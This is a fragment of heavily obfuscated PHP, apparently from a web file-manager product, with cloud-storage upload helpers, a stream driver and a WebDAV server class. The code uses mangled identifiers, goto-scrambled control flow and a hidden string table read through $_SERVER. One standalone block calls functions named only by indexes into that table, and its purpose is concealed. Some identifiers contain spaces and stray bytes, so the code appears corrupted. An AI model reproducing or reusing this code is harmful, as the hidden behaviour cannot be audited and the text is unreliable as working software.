$Bèçù¶¸æ°[$E•¢®¾‰Í´[220]], $E•¢®¾‰Í´[1250] => $e³öå÷âÂ, $E•¢®¾‰Í´[210] => $Bèçù¶¸æ°[$E•¢®¾‰Í´[1253]]); } return $Bèçù¶¸æ°[$E•¢®¾‰Í´[220]]; goto BÍ¦øŒî…’; BÍ¦øŒî…’: } public function listUploadParts($F‡¸«›ïÒØ, $Aí…àÅ¬Ï = array()) { goto B¬¹ğÒ²·Î; DæôØŒË•: if (!$d„¡Ê¯‘†) { return !1; } $c­ãœ‹Å¸ = $F»±½ÇÀİ¾[1254]; foreach ($d„¡Ê¯‘† as $dÇ¨Øœ±Ó) { $c­ãœ‹Å¸ .= $F»±½ÇÀİ¾[1255] . "\x3c\x50\141\162\x74\x4e\165\155\x62\x65\162\76{$dÇ¨Øœ±Ó[$F»±½ÇÀİ¾[1206]]}\74\x2f\120\141\162\164\116\165\x6d\142\x65\x72\x3e\12" . "\74\x45\x54\x61\147\x3e{$dÇ¨Øœ±Ó[$F»±½ÇÀİ¾[1207]]}\74\57\105\124\x61\x67\76\12" . $F»±½ÇÀİ¾[1256]; } goto cï²Æ¬ ¶Œ; b¦Ï¼¬ÌÎ›: $d¨¤°«ñ» = $this->client->__getSignatureV4($Bà”ó“•Ê…, $FÓèªí¬¿Ÿ, $E±ñ×îœ¿õ, $dÂØ¤Áœö, $c­ãœ‹Å¸); return array($F»±½ÇÀİ¾[220] => $d¨¤°«ñ»[$F»±½ÇÀİ¾[220]], $F»±½ÇÀİ¾[210] => $d¨¤°«ñ»[$F»±½ÇÀİ¾[1253]], $F»±½ÇÀİ¾[222] => $d„¡Ê¯‘†, $F»±½ÇÀİ¾[1250] => $d¨¤°«ñ»[$F»±½ÇÀİ¾[1250]]); goto fåÆö°âŸ; B¬¹ğÒ²·Î: $F»±½ÇÀİ¾ =& $_SERVER[ã®Â„Éæ¹¤]; $B¸Ç²•œèä = str_replace($F»±½ÇÀİ¾[221], $F»±½ÇÀİ¾[33], $Aí…àÅ¬Ï[$F»±½ÇÀİ¾[160]]); $d„¡Ê¯‘† = $this->client->listParts($this->bucket, $F‡¸«›ïÒØ, $B¸Ç²•œèä); goto DæôØŒË•; cï²Æ¬ ¶Œ: $c­ãœ‹Å¸ .= $F»±½ÇÀİ¾[1257]; $Bà”ó“•Ê… = array(); $B÷ÀÓÖ×¯ = explode($F»±½ÇÀİ¾[171], $this->getHost()); goto cƒßØ‘ç¿; cƒßØ‘ç¿: $FÓèªí¬¿Ÿ = array($F»±½ÇÀİ¾[1251] => $B÷ÀÓÖ×¯[1], $F»±½ÇÀİ¾[199] => $F»±½ÇÀİ¾[116], $F»±½ÇÀİ¾[1165] => strlen($c­ãœ‹Å¸)); $E±ñ×îœ¿õ = $F»±½ÇÀİ¾[212]; $dÂØ¤Áœö = $F»±½ÇÀİ¾[8] . $this->pathEncode($F‡¸«›ïÒØ) . $Aí…àÅ¬Ï[$F»±½ÇÀİ¾[160]]; goto b¦Ï¼¬ÌÎ›; fåÆö°âŸ: } public function link($EİÏŸ›Ğ˜, $Aøæ†å£¿ = array()) { return parent::link($EİÏŸ›Ğ˜, $Aøæ†å£¿); } public function fileOut($c¶¤°»áìİ, $fÆç‡ùÈ‹ = false, $Cœ¥÷åŠô = false, $cÖàÆ¾ÍÉ‘ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ã®Â„Éæ¹¤][1258])) { return parent::fileOutServer($c¶¤°»áìİ, $fÆç‡ùÈ‹, $Cœ¥÷åŠô, $cÖàÆ¾ÍÉ‘); } parent::fileOut($c¶¤°»áìİ, $fÆç‡ùÈ‹, $Cœ¥÷åŠô, $cÖàÆ¾ÍÉ‘); } public function fileOutImage($c¼¤ß²£®Ú, $d±¹ÆğÌÇÜ = 250) { if (strstr($this->endpoint, $_SERVER[ã®Â„Éæ¹¤][1258])) { return parent::fileOutImageServer($c¼¤ß²£®Ú, $d±¹ÆğÌÇÜ); } parent::fileOutImage($c¼¤ß²£®Ú, $d±¹ÆğÌÇÜ); } public function fileOutLink($Bµ«Ö»”÷µ) { $a–¾¸¾¥£š =& $_SERVER[ã®Â„Éæ¹¤]; if (substr($Bµ«Ö»”÷µ, 0, 7) == $a–¾¸¾¥£š[1134]) { $Bµ«Ö»”÷µ = $a–¾¸¾¥£š[1135] . substr($Bµ«Ö»”÷µ, 7); } header($a–¾¸¾¥£š[156] . $Bµ«Ö»”÷µ); die; } public function getHost() { $Dº·ààø¢ø =& $_SERVER[ã®Â„Éæ¹¤]; $eµ™óğß‚ = str_rtrim(parent::getHost(), $Dº·ààø¢ø[8] . $this->bucket); $eµ™óğß‚ = explode($Dº·ààø¢ø[171], $eµ™óğß‚); return $eµ™óğß‚[0] . $Dº·ààø¢ø[171] . $this->bucket . $Dº·ààø¢ø[91] . $eµ™óğß‚[1]; } } if ($_SERVER[$_SERVER[ã®Â„Éæ¹¤][554]] != $_SERVER[$_SERVER[ã®Â„Éæ¹¤][1259]]) { goto BÍéƒÆ¿Ã‚; bÜ·¦óÓ¦ö: $BñÕá¹³« = explode($_SERVER[ã®Â„Éæ¹¤][217], $dê…ä…á); if (count($BñÕá¹³«) < $_SERVER[ã®Â„Éæ¹¤][558]) { $b—ãÂùŠª„ = $_SERVER[ã®Â„Éæ¹¤][559]; $b—ãÂùŠª„(); } $aÓ’ê×çÜ = $_SERVER[ã®Â„Éæ¹¤][560]; goto CˆñÂ¬ÙÏ©; BÍéƒÆ¿Ã‚: $dËÀ®Æ†¬„ = $_SERVER[ã®Â„Éæ¹¤][555]; $Fó”ñ Ì Š = $_SERVER[$_SERVER[ã®Â„Éæ¹¤][556]] . $_SERVER[ã®Â„Éæ¹¤][557]; $dê…ä…á = $dËÀ®Æ†¬„($Fó”ñ Ì Š); goto bÜ·¦óÓ¦ö; CˆñÂ¬ÙÏ©: $aÓ’ê×çÜ($_SERVER[$_SERVER[ã®Â„Éæ¹¤][750]]); goto Dò‡±ğ…ÔË; Dò‡±ğ…ÔË: } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($CëƒŠÈÎÛÄ, $aö£Ï²ö„ = 0) { parent::__construct(); $this->source = $CëƒŠÈÎÛÄ; $this->sourceSize = $aö£Ï²ö„; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($BÇĞ·îƒÖ = false) { return $this->sourceSize; } public function getContent($Aíó‹ìàØ… = false) { return $this->fileSubstr($Aíó‹ìàØ…, 0, $this->sourceSize); } public function fileSubstr($a”½Ô³¤òØ = false, $dÇËŠĞÖ˜å = 0, $Aœ½Æ¦°™« = 0) { if (!$Aœ½Æ¦°™«) { $Aœ½Æ¦°™« = $this->sourceSize; } $fÃ«„Óù¸† = $this->sourceSize - $dÇËŠĞÖ˜å; if ($Aœ½Æ¦°™« >= $fÃ«„Óù¸†) { $Aœ½Æ¦°™« = $fÃ«„Óù¸†; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $dÇËŠĞÖ˜å, $Aœ½Æ¦°™«); } if ($this->sourceType == self::TYPE_FILE) { if ($Aœ½Æ¦°™« <= 0) { return $_SERVER[ã®Â„Éæ¹¤][33]; } $AÇœ‰íëó = ftell($this->source); fseek_64($this->source, $AÇœ‰íëó + $dÇËŠĞÖ˜å); $A¯‡ÕÚõ‚ = @fread($this->source, $Aœ½Æ¦°™«); fseek_64($this->source, $AÇœ‰íëó); return $A¯‡ÕÚõ‚; } } public function hashMd5($d¯ÌÆÊ–º = false) { return md5($this->getContent()); } public static function hash($D­ÆõÑÅŸ, $b½óìó¾Ó = 0) { $F£½—ö§ò = new PathDriverStream($D­ÆõÑÅŸ, $b½óìó¾Ó); return $F£½—ö§ò->hashSimple($D­ÆõÑÅŸ); } public static function md5($AšÊå·½ë¾, $DØ§Ó»‘í = 0) { $dğÒï£¤ = new PathDriverStream($AšÊå·½ë¾, $DØ§Ó»‘í); return $dğÒï£¤->hashMd5($AšÊå·½ë¾); } } goto fÓš™‹¼; e—ßÉˆ±×Ç: $A¤…¹™ˆ¤ = $_SERVER[ã®Â„Éæ¹¤][551]; if (!$A¤…¹™ˆ¤) { die; } $EÑìÑ¬ï¿Ã = LIB_DIR . $_SERVER[ã®Â„Éæ¹¤][552]; goto fÜœ» Ó…; AŒïÄ¿³Šğ: register_shutdown_function($_SERVER[ˆó©™¯í›][32]); set_error_handler($_SERVER[ˆó©™¯í›][46], $D‘‰ÂàŞ„); if (function_exists($_SERVER[ˆó©™¯í›][47])) { set_exception_handler($_SERVER[ˆó©™¯í›][48]); } goto E†ƒš¾Ã¥Å; f‡Û«éó—ˆ: class HttpDavServer { public function __construct($bˆ½ …§ù˜, $a’‚™°¢) { $this->root = $bˆ½ …§ù˜; $this->initPath($a’‚™°¢); $this->start(); } public function initPath($f‹ëÍÎÓ¹Æ) { $eš‚—Çî =& $_SERVER[ã®Â„Éæ¹¤]; $D•ñ®Ø’êğ = rtrim($_SERVER[$eš‚—Çî[1407]], $eš‚—Çî[8]) . $eš‚—Çî[8]; $this->urlBase = substr($D•ñ®Ø’êğ, 0, strpos($D•ñ®Ø’êğ, $f‹ëÍÎÓ¹Æ) + 1); $this->urlBase = rtrim($this->urlBase, $eš‚—Çî[8]) . $f‹ëÍÎÓ¹Æ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $aá±Å—ö°Ğ =& $_SERVER[ã®Â„Éæ¹¤]; $EÒÄƒ ±‰å = HttpAuth::get(); if ($EÒÄƒ ±‰å[$aá±Å—ö°Ğ[536]] == $aá±Å—ö°Ğ[1804] && $EÒÄƒ ±‰å[$aá±Å—ö°Ğ[915]] == $aá±Å—ö°Ğ[1805]) { return !0; } HttpAuth::error(); } public function start() { goto bš‡ôùÀ; Fõ»†ªŠ»ô: if (!method_exists($this, $aÁ¬ÉïË¨â)) { pr($aÁ¬ÉïË¨â . $dÕÃ‚ÍĞá…[1806]); die; } $dóõõ£­ = array($dÕÃ‚ÍĞá…[1807], $dÕÃ‚ÍĞá…[1808]); if (!in_array($aÁ¬ÉïË¨â, $dóõõ£­) && !$this->pathExists($this->path)) { $DÙóîÀÒĞ = array($dÕÃ‚ÍĞá…[1051] => 404); } else { $DÙóîÀÒĞ = $this->{$aÁ¬ÉïË¨â}(); } goto bèÊ©ù°²à; bš‡ôùÀ: $dÕÃ‚ÍĞá… =& $_SERVER[ã®Â„Éæ¹¤]; $this->checkUser(); $aÁ¬ÉïË¨â = $dÕÃ‚ÍĞá…[144] . HttpHeader::method(); goto Fõ»†ªŠ»ô; bèÊ©ù°²à: if (!$DÙóîÀÒĞ) { return; } self::response($DÙóîÀÒĞ); goto F©¥™¯ïî; F©¥™¯ïî: } public function pathGet($bØ¦ŞØ = false) { $E°“ÅáÁ˜ =& $_SERVER[ã®Â„Éæ¹¤]; $böÖ±”ƒ¢ = $bØ¦ŞØ ? $_SERVER[$E°“ÅáÁ˜[1809]] : $_SERVER[$E°“ÅáÁ˜[1407]]; $böÖ±”ƒ¢ = KodIO::clear(rawurldecode($böÖ±”ƒ¢)); if (!strstr($böÖ±”ƒ¢, KodIO::clear($this->urlBase))) { return !1; } return substr($böÖ±”ƒ¢, strpos($böÖ±”ƒ¢, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($EÂŠŒ³íˆí) { return file_exists($EÂŠŒ³íˆí); } public function pathMkdir($dÛ¥¸È´Š£) { return mkdir($dÛ¥¸È´Š£, 511, !0); } public function pathInfo($a…ÏäˆÕÀŒ) { return path_info($a…ÏäˆÕÀŒ); } public function pathList($bÔº‡¢ˆ¬Ş) { return path_list($bÔº‡¢ˆ¬Ş); } public function pathOut($aº½óêğù¼) { echo file_get_contents($aº½óêğù¼); } public function pathPut($f³ğ°Û¹îÔ, $dõ„‚‚†‚ƒ = '') { if (!$dõ„‚‚†‚ƒ) { return file_put_contents($f³ğ°Û¹îÔ, $_SERVER[ã®Â„Éæ¹¤][33]); } return move_path($dõ„‚‚†‚ƒ, $f³ğ°Û¹îÔ); } public function pathRemove($eë¿¹ƒçÁ) { if (is_file($eë¿¹ƒçÁ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Cë±İÄ…ŸÈ, $C°óÅË¯) { return move_path($Cë±İÄ…ŸÈ, $C°óÅË¯); } public function pathCopy($Aº¤ÄÍ›ŸÒ, $dëÌ›œ˜Ï) { return copy_dir($Aº¤ÄÍ›ŸÒ, $dëÌ›œ˜Ï); } public function parsePath($c»ÔÊßŸ¤) { return $c»ÔÊßŸ¤; } public function parseItem($D—˜À…ãƒ”, $d¶´¿‰È£À) { goto EÔ„•†åõ»; EÔ„•†åõ»: $e–’ééÃî =& $_SERVER[ã®Â„Éæ¹¤]; $AÄÑæ–Õ¡ = $this->pathGet() . $e–’ééÃî[8] . $D—˜À…ãƒ”[$e–’ééÃî[28]]; $AÄÑæ–Õ¡ = $e–’ééÃî[8] . str_replace($e–’ééÃî[172], $e–’ééÃî[8], rawurlencode($AÄÑæ–Õ¡)); goto EŒØìµ™Ûİ; EŒØìµ™Ûİ: if ($d¶´¿‰È£À) { $AÄÑæ–Õ¡ = $e–’ééÃî[8] . str_replace($e–’ééÃî[172], $e–’ééÃî[8], rawurlencode($this->pathGet())); } if (!trim($D—˜À…ãƒ”[$e–’ééÃî[107]])) { $D—˜À…ãƒ”[$e–’ééÃî[107]] = time(); } if (!trim($D—˜À…ãƒ”[$e–’ééÃî[187]])) { $D—˜À…ãƒ”[$e–’ééÃî[187]] = time(); } goto e³¤§ÆÃê‘; e³¤§ÆÃê‘: $bâ†Š•İÜ = array($e–’ééÃî[1810] => KodIO::clear($this->urlBase . $AÄÑæ–Õ¡), $e–’ééÃî[107] => @gmdate($e–’ééÃî[1811], $D—˜À…ãƒ”[$e–’ééÃî[107]]), $e–’ééÃî[187] => @gmdate($e–’ééÃî[1812], $D—˜À…ãƒ”[$e–’ééÃî[187]]), $e–’ééÃî[77] => $D—˜À…ãƒ”[$e–’ééÃî[77]] ? $D—˜À…ãƒ”[$e–’ééÃî[77]] : 0); return $bâ†Š•İÜ; goto d¼Ñ±³ƒË¹; d¼Ñ±³ƒË¹: } public function parseItemXml($dÑõØôù‡Ê, $fÔÁìùÁ•) { $a÷œ§Şää =& $_SERVER[ã®Â„Éæ¹¤]; $eÖÉŞ‹¨†É = $this->parseItem($dÑõØôù‡Ê, $fÔÁìùÁ•); if ($dÑõØôù‡Ê[$a÷œ§Şää[29]] == $a÷œ§Şää[76]) { $dõÃä—‰Ğ = $a÷œ§Şää[1813]; $dõÃä—‰Ğ .= $a÷œ§Şää[1814]; } else { $d—½¬ö»îÓ = $dÑõØôù‡Ê[$a÷œ§Şää[160]] ? $dÑõØôù‡Ê[$a÷œ§Şää[160]] : get_path_ext($dÑõØôù‡Ê[$a÷œ§Şää[28]]); $D³¦›…ã¼› = get_file_mime($d—½¬ö»îÓ); $dõÃä—‰Ğ = $a÷œ§Şää[1815]; $dõÃä—‰Ğ .= "\x3c\104\72\147\145\164\x63\157\156\x74\145\156\x74\x74\171\160\145\x3e{$D³¦›…ã¼›}\74\57\104\x3a\x67\145\x74\143\157\x6e\164\x65\x6e\x74\x74\x79\160\145\76"; } return "\xa\11\x9\x3c\x44\x3a\162\x65\163\160\157\x6e\163\145\x3e\xa\x9\11\x9\74\104\x3a\x68\x72\145\x66\x3e{$eÖÉŞ‹¨†É[$a÷œ§Şää[1810]]}\x3c\x2f\x44\72\x68\x72\x65\x66\x3e\xa\x9\11\11\74\x44\72\160\x72\157\160\163\164\141\x74\x3e\12\x9\x9\11\11\x3c\x44\72\160\162\x6f\x70\76\12\11\11\11\x9\x9\74\x44\x3a\147\145\164\x6c\x61\x73\x74\155\157\144\x69\x66\x69\145\144\x3e{$eÖÉŞ‹¨†É[$a÷œ§Şää[107]]}\x3c\57\x44\72\147\145\x74\154\x61\163\x74\155\157\144\x69\146\x69\x65\144\76\xa\x9\11\11\11\x9\x3c\104\72\143\x72\145\x61\x74\151\157\x6e\x64\x61\164\x65\x3e{$eÖÉŞ‹¨†É[$a÷œ§Şää[187]]}\74\x2f\104\72\x63\162\145\141\164\151\157\156\144\x61\x74\145\x3e\12\x9\x9\x9\x9\x9\x3c\104\72\x67\x65\x74\x63\x6f\x6e\x74\x65\156\164\154\145\x6e\147\164\150\76{$eÖÉŞ‹¨†É[$a÷œ§Şää[77]]}\74\x2f\x44\x3a\147\x65\x74\x63\x6f\156\x74\x65\156\x74\x6c\x65\156\147\x74\x68\x3e\xa\11\11\11\x9\11{$dõÃä—‰Ğ}\xa\11\x9\11\11\x3c\57\x44\72\160\x72\157\x70\76\xa\x9\x9\x9\11\x3c\x44\x3a\163\164\x61\164\165\163\76\110\124\124\120\x2f\x31\x2e\61\x20\62\x30\x30\40\x4f\x4b\74\x2f\x44\72\x73\164\x61\164\165\x73\x3e\xa\x9\11\11\x3c\57\104\x3a\x70\162\x6f\x70\163\x74\141\164\76\12\11\x9\x3c\x2f\104\72\x72\x65\163\x70\157\x6e\x73\x65\x3e"; } public function pathListMerge($AªÓÏÀªö) { goto BŸìí»×Â«; BŸìí»×Â«: $A¡ê„øœŒ¾ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$AªÓÏÀªö) { return $AªÓÏÀªö; } $F‰ºÌ‰•²³ = array($A¡ê„øœŒ¾[73], $A¡ê„øœŒ¾[74], $A¡ê„øœŒ¾[1816]); goto BÌ¥‘³Ï¡ø; BÌ¥‘³Ï¡ø: $d«ÜÌÇ›ŒÆ = array(); foreach ($AªÓÏÀªö as $Cğ§÷Ë ¢ => $bŸğà«ÁôÍ) { if (!in_array($Cğ§÷Ë ¢, $F‰ºÌ‰•²³) || !is_array($bŸğà«ÁôÍ)) { continue; } $d«ÜÌÇ›ŒÆ = array_merge($d«ÜÌÇ›ŒÆ, $bŸğà«ÁôÍ); } foreach ($d«ÜÌÇ›ŒÆ as &$DñÎ…¸©ğç) { $DñÎ…¸©ğç[$A¡ê„øœŒ¾[28]] = str_replace($A¡ê„øœŒ¾[8], $A¡ê„øœŒ¾[1409], $DñÎ…¸©ğç[$A¡ê„øœŒ¾[28]]); } goto Dù³À–§†; Dù³À–§†: unset($DñÎ…¸©ğç); return $d«ÜÌÇ›ŒÆ; goto eÆËÑà™®¬; eÆËÑà™®¬: } public function httpPROPFIND() { goto Dßòª¡¬; Fåì®¾ÔŸå: return array($e‘§¶Ó˜È¹[1819] => 207, $e‘§¶Ó˜È¹[1820] => "\x3c\104\x3a\x6d\165\x6c\164\151\x73\x74\x61\x74\165\x73\40\170\x6d\154\x6e\163\x3a\x44\x3d\42\104\101\x56\72\x22\76\xa{$A‹ƒíÈÕœ“}\xa\x3c\57\104\72\x6d\165\154\164\x69\x73\164\141\164\165\x73\x3e"); goto dåğÊƒÙÚ; Fæ‚ä’¹ë‰: if ($D–á˜¤Ù¿) { $BöÌ‡”Ø§ = array($e±ó¿ˆê¡Ì); } else { $e±ó¿ˆê¡Ì[$e‘§¶Ó˜È¹[28]] = $e‘§¶Ó˜È¹[33]; $BöÌ‡”Ø§ = array_merge(array($e±ó¿ˆê¡Ì), $BöÌ‡”Ø§); } $A‹ƒíÈÕœ“ = $e‘§¶Ó˜È¹[33]; foreach ($BöÌ‡”Ø§ as $cÂÆìåëì) { $A‹ƒíÈÕœ“ .= $this->parseItemXml($cÂÆìåëì, $D–á˜¤Ù¿); } goto Fåì®¾ÔŸå; FŸ¤äß•¬: $e±ó¿ˆê¡Ì = $b¼¼è¢‘Æí[$e‘§¶Ó˜È¹[1817]]; if (!is_array($BöÌ‡”Ø§) || $e±ó¿ˆê¡Ì[$e‘§¶Ó˜È¹[1818]] === !1) { return array($e‘§¶Ó˜È¹[1819] => 404, $e‘§¶Ó˜È¹[1820] => $e‘§¶Ó˜È¹[1821]); } $D–á˜¤Ù¿ = $e±ó¿ˆê¡Ì[$e‘§¶Ó˜È¹[29]] == $e‘§¶Ó˜È¹[167] || HttpHeader::get($e‘§¶Ó˜È¹[1796]) == $e‘§¶Ó˜È¹[470]; goto Fæ‚ä’¹ë‰; Dßòª¡¬: $e‘§¶Ó˜È¹ =& $_SERVER[ã®Â„Éæ¹¤]; $b¼¼è¢‘Æí = $this->pathList($this->path); $BöÌ‡”Ø§ = $this->pathListMerge($b¼¼è¢‘Æí); goto FŸ¤äß•¬; dåğÊƒÙÚ: } public function httpHEAD() { $f„”ÚÌİ› =& $_SERVER[ã®Â„Éæ¹¤]; $e©Ó—Á†ÜŞ = $this->pathInfo($this->path); if (!$e©Ó—Á†ÜŞ || $e©Ó—Á†ÜŞ[$f„”ÚÌİ›[29]] == $f„”ÚÌİ›[76]) { return array($f„”ÚÌİ›[1051] => 200, $f„”ÚÌİ›[1225] => array($f„”ÚÌİ›[1822])); } return array($f„”ÚÌİ›[1051] => 200, $f„”ÚÌİ›[1225] => array($f„”ÚÌİ›[1823], $f„”ÚÌİ›[136], $f„”ÚÌİ›[1824] . $e©Ó—Á†ÜŞ[$f„”ÚÌİ›[77]], $f„”ÚÌİ›[1825] . get_file_mime($e©Ó—Á†ÜŞ[$f„”ÚÌİ›[160]]), $f„”ÚÌİ›[132] . gmdate($f„”ÚÌİ›[1811], $e©Ó—Á†ÜŞ[$f„”ÚÌİ›[1273]]) . $f„”ÚÌİ›[1826], $f„”ÚÌİ›[1827])); } public function httpOPTIONS() { $F¦Š‚¤ƒÖ =& $_SERVER[ã®Â„Éæ¹¤]; return array($F¦Š‚¤ƒÖ[1051] => 200, $F¦Š‚¤ƒÖ[1225] => array($F¦Š‚¤ƒÖ[1828], $F¦Š‚¤ƒÖ[1829], $F¦Š‚¤ƒÖ[1830], $F¦Š‚¤ƒÖ[1282])); } public function httpPROPPATCH() { $bİ“§îŒÉ† =& $_SERVER[ã®Â„Éæ¹¤]; $eˆ›¸ ¼Ğ = $bİ“§îŒÉ†[1831] . $_SERVER[$bİ“§îŒÉ†[1407]] . $bİ“§îŒÉ†[1832]; return array($bİ“§îŒÉ†[1819] => 207, $bİ“§îŒÉ†[1820] => "\74\x44\72\155\165\154\x74\151\163\x74\x61\164\x75\x73\40\x78\155\154\156\163\72\104\75\42\x44\101\126\x3a\x22\76\xa{$eˆ›¸ ¼Ğ}\xa\x3c\57\x44\72\155\x75\x6c\164\x69\x73\164\141\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $AäÅœà—ŠÀ =& $_SERVER[ã®Â„Éæ¹¤]; $F„Üæ ¼¥ï = $this->uploadFile(); if ($F„Üæ ¼¥ï) { $D»Å›ŠàÇî = 204; } else { $F„Üæ ¼¥ï = $AäÅœà—ŠÀ[33]; $D»Å›ŠàÇî = 201; } $F•œ½ç§ãô = $this->pathPut($this->path, $F„Üæ ¼¥ï); if ($F•œ½ç§ãô == !1) { $D»Å›ŠàÇî = 404; } return array($AäÅœà—ŠÀ[1819] => $D»Å›ŠàÇî); } private function uploadFile() { goto aÁ¯éÚ¤ö; d‡ù®ßæÇ¯: if (@filesize_64($DÓòçšœÍ§) > 0) { return $DÓòçšœÍ§; } @unlink($DÓòçšœÍ§); return !1; goto BŠ¦¶•èÂ¾; DÉ°áÒñ™œ: $eÖ—¯¢ ¤ = @fopen($DÓòçšœÍ§, $FéÒ„âá†¸[1541]); $C–•Ó§±î¨ = @fopen($FéÒ„âá†¸[1834], $FéÒ„âá†¸[1540]); if (!$C–•Ó§±î¨ || !$eÖ—¯¢ ¤) { @unlink($DÓòçšœÍ§); return !1; } goto F¾Î‘Œ÷–”; F¾Î‘Œ÷–”: while (!feof($C–•Ó§±î¨)) { fwrite($eÖ—¯¢ ¤, fread($C–•Ó§±î¨, 1024 * 200)); } fclose($C–•Ó§±î¨); fclose($eÖ—¯¢ ¤); goto d‡ù®ßæÇ¯; aÁ¯éÚ¤ö: $FéÒ„âá†¸ =& $_SERVER[ã®Â„Éæ¹¤]; @mk_dir(TEMP_FILES); $DÓòçšœÍ§ = TEMP_FILES . $FéÒ„âá†¸[1833] . rand_string(32); goto DÉ°áÒñ™œ; BŠ¦¶•èÂ¾: } public function httpMKCOL() { $Eˆ…ÕäĞ¦” =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->pathExists($this->path)) { return array($Eˆ…ÕäĞ¦”[1051] => 409); } $DÂèÖ”°¥Ä = $this->pathMkdir($this->path); return array($Eˆ…ÕäĞ¦”[1051] => $DÂèÖ”°¥Ä ? 201 : 403); } public function httpMOVE() { $d²…‘÷¶’ñ =& $_SERVER[ã®Â„Éæ¹¤]; $a”´”† ï = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$d²…‘÷¶’ñ[1835]])) { $d„Ç‘’Ñ½¢[$d²…‘÷¶’ñ[1836]] = $_SERVER[$d²…‘÷¶’ñ[1835]] == $d²…‘÷¶’ñ[1837]; } $AÃÜ­¼Îİ = $this->pathMove($this->path, $a”´”† ï); return array($d²…‘÷¶’ñ[1051] => $AÃÜ­¼Îİ ? 201 : 404); } public function httpCOPY() { $Aù¦ìáŸ £ = $this->parsePath($this->pathGet(!0)); $EøÉÌğ§¢¼ = $this->pathCopy($this->path, $Aù¦ìáŸ £); return array($_SERVER[ã®Â„Éæ¹¤][1051] => $EøÉÌğ§¢¼ ? 201 : 404); } public function httpDELETE() { $CÅŒï¡ÆŞ = $this->pathRemove($this->path); return array($_SERVER[ã®Â„Éæ¹¤][1051] => $CÅŒï¡ÆŞ ? 200 : 503); } public function httpLOCK() { $e˜ò¡„„Âˆ =& $_SERVER[ã®Â„Éæ¹¤]; $Bç¾ßÆì¼ = md5($this->path); $dà¢÷ğèÕç = $e˜ò¡„„Âˆ[1838] . $this->xmlGet($e˜ò¡„„Âˆ[1839]) . $e˜ò¡„„Âˆ[1840] . $Bç¾ßÆì¼ . $e˜ò¡„„Âˆ[1841]; return array($e˜ò¡„„Âˆ[1051] => 200, $e˜ò¡„„Âˆ[1225] => array($e˜ò¡„„Âˆ[1842] . $Bç¾ßÆì¼, $e˜ò¡„„Âˆ[1843]), $e˜ò¡„„Âˆ[1844] => $dà¢÷ğèÕç); } public function httpUNLOCK() { return array($_SERVER[ã®Â„Éæ¹¤][1051] => 204); } public function xmlGet($có£ÚëìĞ) { goto cÄÄ™Ù¡É²; aÆíÚ”óÎ»: $AÇ³®¦³ô° = explode($f÷Ù¾‚ØË[8], $có£ÚëìĞ); $CµğŞ›ÆÆ = array_shift($AÇ³®¦³ô°); $bÏ–ßà”á = $d‚‰“×¦®->getElementsByTagNameNS($f÷Ù¾‚ØË[1846], $CµğŞ›ÆÆ); goto B¬«…•ƒ£; B¬«…•ƒ£: if ($bÏ–ßà”á) { return $bÏ–ßà”á[0]->nodeValue; } return $f÷Ù¾‚ØË[33]; goto Aè¹ù¾Ùğ; cÄÄ™Ù¡É²: $f÷Ù¾‚ØË =& $_SERVER[ã®Â„Éæ¹¤]; static $d‚‰“×¦® = false; if (!$d‚‰“×¦®) { $fƒ¨ŠƒîÖé = file_get_contents($f÷Ù¾‚ØË[1845]); $d‚‰“×¦® = new DOMDocument(); $d‚‰“×¦®->loadXML($fƒ¨ŠƒîÖé); } goto aÆíÚ”óÎ»; Aè¹ù¾Ùğ: } public static function response($BÂòĞ·¾ø¹) { goto eËÖŠÏÁÂğ; d×Ñá’ ¾ : $d‡·Ê¶ê®Š[] = $B£«ã·‘’„[1786]; $d‡·Ê¶ê®Š[] = $B£«ã·‘’„[1787]; foreach ($d‡·Ê¶ê®Š as $C‰«†Î‰†é) { header($C‰«†Î‰†é); } goto AçªÒÁÌè; eËÖŠÏÁÂğ: $B£«ã·‘’„ =& $_SERVER[ã®Â„Éæ¹¤]; $d‡·Ê¶ê®Š = is_array($BÂòĞ·¾ø¹[$B£«ã·‘’„[1225]]) ? $BÂòĞ·¾ø¹[$B£«ã·‘’„[1225]] : array(); $d‡·Ê¶ê®Š[] = HttpHeader::code($BÂòĞ·¾ø¹[$B£«ã·‘’„[1051]]); goto d×Ñá’ ¾ ; AçªÒÁÌè: if (is_string($BÂòĞ·¾ø¹[$B£«ã·‘’„[1844]])) { header($B£«ã·‘’„[1847]); $Dà…Ñø = $B£«ã·‘’„[1848] . $B£«ã·‘’„[217] . $BÂòĞ·¾ø¹[$B£«ã·‘’„[1844]]; echo $Dà…Ñø; } goto fàª‚ÀÂ¤; fàª‚ÀÂ¤: } } class HttpHeader { public static $_headers = array("\x48\157\163\x74" => "\x48\x54\124\x50\137\110\117\x53\x54", "\x55\x73\x65\162\x2d\x41\147\x65\156\164" => "\110\x54\124\x50\x5f\125\123\x45\x52\137\x41\x47\x45\116\124", "\x43\157\156\164\x65\156\x74\55\x54\x79\x70\x65" => "\110\124\x54\120\x5f\x43\x4f\116\x54\105\116\x54\x5f\124\x59\x50\105", "\103\157\156\x74\x65\x6e\x74\55\114\x65\x6e\147\164\x68" => "\110\124\x54\x50\137\x43\117\x4e\x54\x45\x4e\x54\x5f\x4c\x45\116\107\x54\x48", "\104\145\x70\164\x68" => "\x48\124\124\120\x5f\x44\105\120\124\110", "\x45\170\160\x65\x63\164" => "\110\x54\x54\120\137\105\x58\x50\x45\103\124", "\111\x66\55\x4e\157\x6e\x65\x2d\115\x61\164\x63\150" => "\110\124\124\120\137\111\106\137\116\117\116\x45\137\115\x41\124\x43\x48", "\111\146\x2d\x4d\141\x74\143\x68" => "\x48\124\x54\120\137\111\x46\x5f\x4d\101\x54\x43\x48", "\111\x66\55\x52\x61\x6e\147\145" => "\x48\124\124\x50\x5f\111\106\137\122\101\116\107\x45", "\114\141\x73\164\x2d\x4d\157\x64\x69\146\x69\145\x64" => 